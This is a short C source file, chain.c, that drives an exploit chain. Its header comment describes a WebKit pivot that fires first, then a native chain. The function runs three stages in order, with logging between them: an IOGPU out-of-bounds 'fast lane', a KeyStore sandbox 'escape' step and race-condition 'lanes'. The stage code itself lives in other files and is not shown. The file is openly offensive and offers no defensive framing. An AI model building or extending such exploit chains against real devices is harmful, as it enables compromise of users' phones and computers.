/* chain.c — dj's order v3: WebKit pivot runs FIRST (auto, fired by the
   UIBridge gate on WPROBE3 = recon complete). This native chain fires only
   after that. (1) IOGPU OOB fast lane, (2) escape attempt = KeyStore
   s17/s35 grid, (3) race lanes. Continuous chain log. */
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include "exploit.h"

void nk_chain_run(void) {
    nk_filelog_open("chain");
    nk_log("[gen] stage 0: IOGPU OOB fast lane (direct)");
    nk_iogpu_oob_run();
    nk_filelog_reopen_kind("chain");
    nk_log("[gen] stage 0 done -> stage 1: escape (KeyStore s17/s35)");
    nk_ksmagic_run();
    nk_filelog_reopen_kind("chain");
    nk_log("[esc] stage 1 done -> stage 2: race");
    fflush(stdout);
    nk_racer_run();
    nk_filelog_reopen_kind("chain");
    nk_log("[gen] stage 2 done -> chain end");
    nk_filelog_close();
}
